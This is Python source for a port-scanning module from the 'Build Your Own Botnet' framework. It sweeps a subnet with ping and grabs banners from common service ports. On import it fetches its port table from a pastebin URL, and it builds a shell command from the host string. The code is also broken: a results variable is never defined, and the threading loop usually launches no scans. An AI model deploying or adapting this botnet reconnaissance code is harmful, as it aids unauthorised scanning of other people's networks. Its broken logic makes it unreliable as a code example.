#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""

from __future__ import print_function

# standard libarary

import os
import sys
import time
import json
import Queue
import socket
import random
import urllib
import argparse
import threading
import subprocess
import collections

# remote imports

import util

# globals

packages  = []
platforms = ['win32','linux2','darwin']
tasks     = Queue.Queue()
ports     = json.loads(urllib.urlopen('https://pastebin.com/raw/BCjkh5Gh').read())
threads   = collections.OrderedDict()
targets   = []
util.is_compatible(platforms, __name__)
util.imports(packages)

@util.threaded
def _threader(tasks):
    while True:
        try:
            method, task = tasks.get_nowait()
            if callable(method):
                _ = method(task)
            tasks.task_done()
        except:
            break

def _ping(host):
    try:
        if host not in __results:
            if subprocess.call("ping -{} 1 -w 90 {}".format('n' if os.name is 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                __results[host] = {}
                return True
            else:
                return False
        else:
            return True
    except:
        return False

def _scan(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                                                                            
        sock.settimeout(1.0)
        sock.connect((str(target.host), int(target.port)))
        data = sock.recv(1024)
        sock.close()
        if data:
            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
            data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')
            item = { str(target.port) : { 'protocol': globals()['ports'][str(target.port)]['protocol'], 'service': data, 'state': 'open'}}
        else:
            item = { str(target.port) : { 'protocol': globals()['ports'][str(target.port)]['protocol'], 'service': globals()['ports'][str(target.port)]['service'], 'state': 'open'}}
        __results.get(target.host).update(item)
    except (socket.error, socket.timeout):
        pass
    except Exception as e:
        util.debug("{} error: {}".format(_scan.func_name, str(e)))


def run(target='127.0.0.1', subnet=False, ports=[21,22,23,25,80,110,111,135,139,443,445,993,995,1433,1434,3306,3389,8000,8008,8080,8888]):    
    """
    Run a portscan against a target hostname/IP address
        
    :param str target: Valid IPv4 address
    :param list ports: Port numbers to scan on target host
    :returns: Results in a nested dictionary object in JSON format
    :rtype: dict
    """
    try:
        if not util.ipv4(target):
            raise ValueError("target is not a valid IPv4 address")
        task = collections.namedtuple('Target', ['host', 'port'])
        stub = '.'.join(target.split('.')[:-1]) + '.%d'
        util.debug('Scanning for online hosts in subnet {} - {}'.format(stub % 1, stub % 255))
        if subnet:
            for x in range(1,255):
                if _ping(stub % x):
                    globals()['targets'].append(stub % x)
                    for port in ports:
                        globals()['tasks'].put_nowait((_scan, task(stub % x, port)))
        else:
            globals()['targets'].append(target)
            if _ping(target):
                for port in ports:
                    globals()['tasks'].put_nowait((_scan, task(target, port)))
        if globals()['tasks'].qsize():
            for i in range(1, int((globals()['tasks'].qsize() / 100) if globals()['tasks'].qsize() >= 100 else 1)):
                threads['portscan-%d' % i] = _threader(globals()['tasks'])
            if __results and len(__results):
                return dict({k: __results[k] for k in sorted(__results.keys()) if k in globals()['targets']})
            else:
                return "Target(s) offline"
    except Exception as e:
        util.debug("{} error: {}".format(_scan.func_name, str(e)))

